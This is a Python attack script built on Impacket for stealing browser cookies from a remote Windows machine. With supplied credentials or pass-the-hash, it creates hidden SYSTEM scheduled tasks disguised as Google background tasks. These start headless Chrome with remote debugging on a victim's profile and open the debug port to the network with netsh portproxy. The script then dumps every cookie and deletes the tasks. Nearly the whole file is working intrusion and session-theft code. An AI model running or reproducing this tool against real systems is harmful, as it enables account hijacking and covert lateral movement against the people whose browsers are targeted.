#!/usr/bin/env python3

from __future__ import division
from __future__ import print_function
import string
import sys
import argparse
import time
import random
import logging

import pydevtools
from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, \
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.examples.utils import parse_target
from impacket.krb5.keytab import Keytab
from six import PY2

CODEC = sys.stdout.encoding

class TSCH_EXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None,
                  sessionId=None, userdatadir="", localport=9222, openport=9221):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.userdatadir = userdatadir
        self.sessionId = sessionId
        self.localport = localport
        self.openport = openport

        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def play(self, addr):
        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % addr
        rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                         self.__aesKey)
            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
        try:
            logging.info('[+] starting Chrome with TSCH_EXEC')
            self.startChrome(rpctransport)
            logging.info('[+] forwarding the port with TSCH_EXEC')
            self.startPortProxy(rpctransport)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >=0:
                logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')

    def startChrome(self, rpctransport):
        def output_callback(data):
            try:
                print(data.decode(CODEC))
            except UnicodeDecodeError:
                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute atexec.py '
                              'again with -codec and the corresponding codec')
                print(data.decode(CODEC, errors='replace'))

        def xml_escape(data):
            replace_table = {
                 "&": "&amp;",
                 '"': "&quot;",
                 "'": "&apos;",
                 ">": "&gt;",
                 "<": "&lt;",
                 }
            return ''.join(replace_table.get(c, c) for c in data)

        dce = rpctransport.get_dce_rpc()

        dce.set_credentials(*rpctransport.get_credentials())
        if self.__doKerberos is True:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)

        tmpName = "Google_Background_Task_%s" % ''.join([random.choice(string.ascii_letters) for _ in range(8)])
        
        

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2017-11-02T21:00:21.1543312</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
   <Actions Context="LocalSystem">
    <Exec>
      <Command>C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Command>
      <Arguments>https://microsoft.com --headless --remote-debugging-port=%d --user-data-dir=&quot;C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data&quot; --remote-allow-origins=*</Arguments>
    </Exec>
  </Actions>
</Task>
        """ % (self.localport, self.userdatadir)
        taskCreated = False
        try:
            logging.info('Creating task \\%s' % tmpName)
            tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
            taskCreated = True

            logging.info('Running task \\%s' % tmpName)
            done = False

            
            try:
                tsch.hSchRpcRun(dce, '\\%s' % tmpName, flags=tsch.TASK_RUN_USE_SESSION_ID, sessionId=self.sessionId)
            except Exception as e:
                if str(e).find('ERROR_FILE_NOT_FOUND') >= 0 or str(e).find('E_INVALIDARG') >= 0 :
                    logging.info('The specified session doesn\'t exist!')
                    done = True
                else:
                    raise

            while not done:
                logging.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
                resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
                if resp['pLastRuntime']['wYear'] != 0:
                    done = True
                else:
                    time.sleep(2)

            logging.info('Deleting task \\%s' % tmpName)
            tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
            taskCreated = False
        except tsch.DCERPCSessionError as e:
            logging.error(e)
            e.get_packet().dump()
        finally:
            if taskCreated is True:
                tsch.hSchRpcDelete(dce, '\\%s' % tmpName)

        
        dce.disconnect()
        return

    def startPortProxy(self, rpctransport):
        def output_callback(data):
            try:
                print(data.decode(CODEC))
            except UnicodeDecodeError:
                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute atexec.py '
                              'again with -codec and the corresponding codec')
                print(data.decode(CODEC, errors='replace'))

        def xml_escape(data):
            replace_table = {
                 "&": "&amp;",
                 '"': "&quot;",
                 "'": "&apos;",
                 ">": "&gt;",
                 "<": "&lt;",
                 }
            return ''.join(replace_table.get(c, c) for c in data)

        dce = rpctransport.get_dce_rpc()

        dce.set_credentials(*rpctransport.get_credentials())
        if self.__doKerberos is True:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)

        tmpName = "Google_Background_Task_PP_%s" % ''.join([random.choice(string.ascii_letters) for _ in range(8)])
        
        

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2017-11-02T21:00:21.1543312</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
   <Actions Context="LocalSystem">
    <Exec>
      <Command>C:\\Windows\\System32\\netsh.exe</Command>
      <Arguments>interface portproxy add v4tov4 listenport=%d listenaddress=0.0.0.0 connectport=%d connectaddress=127.0.0.1</Arguments>
    </Exec>
  </Actions>
</Task>
        """ % (self.openport, self.localport)
        taskCreated = False
        try:
            logging.info('Creating task \\%s' % tmpName)
            tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
            taskCreated = True

            logging.info('Running task \\%s' % tmpName)
            done = False

            
            try:
                tsch.hSchRpcRun(dce, '\\%s' % tmpName)
            except Exception as e:
                if str(e).find('ERROR_FILE_NOT_FOUND') >= 0 or str(e).find('E_INVALIDARG') >= 0 :
                    logging.info('The specified session doesn\'t exist!')
                    done = True
                else:
                    raise

            while not done:
                logging.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
                resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
                if resp['pLastRuntime']['wYear'] != 0:
                    done = True
                else:
                    time.sleep(2)

            logging.info('Deleting task \\%s' % tmpName)
            tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
            taskCreated = False
        except tsch.DCERPCSessionError as e:
            logging.error(e)
            e.get_packet().dump()
        finally:
            if taskCreated is True:
                tsch.hSchRpcDelete(dce, '\\%s' % tmpName)

        
        dce.disconnect()
        return



def dump_cookies(addr, port, json):
    chrome = pydevtools.ChromeInterface(host=addr,port=port)
    chrome.Storage.enable()
    
    cookies = chrome.Storage.getCookies()
    if json:
        print(json.dumps(cookies[0]))
    else:
        for cookie in cookies[0]["result"]["cookies"]:
            print("[+] %s -> %s:%s" % (cookie["domain"], cookie["name"], cookie["value"]))


# Process command-line arguments.
if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser()

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-session-id', action='store', required=True, type=int, help='an existed logon session to use')
    parser.add_argument('-datadir', action='store', required=True, help='username to resolve the chrome data directory')
    
    parser.add_argument('-renew', action='store_true', help='assume chrome is already accessible')
    parser.add_argument('-json', action='store_true', help='dump cookies as json')

    parser.add_argument('-localport', action='store', default=9222, type=int, help='port for chrome remote debugging (on local host)')
    parser.add_argument('-openport', action='store', default=9221, type=int, help='port for port forwarding')
    

    parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. '
                                         'If omitted it will use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    logging.warning("This will work ONLY on Windows >= Vista")

 
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)

    if domain is None:
        domain = ''

    if options.keytab is not None:
        Keytab.loadKeysFromKeytab (options.keytab, username, domain, options)
        options.k = True

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if not options.renew:
        atsvc_exec = TSCH_EXEC(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip,
                        options.session_id, options.datadir, options.localport, options.openport)
        atsvc_exec.play(address)

    dump_cookies(address, options.openport, options.json)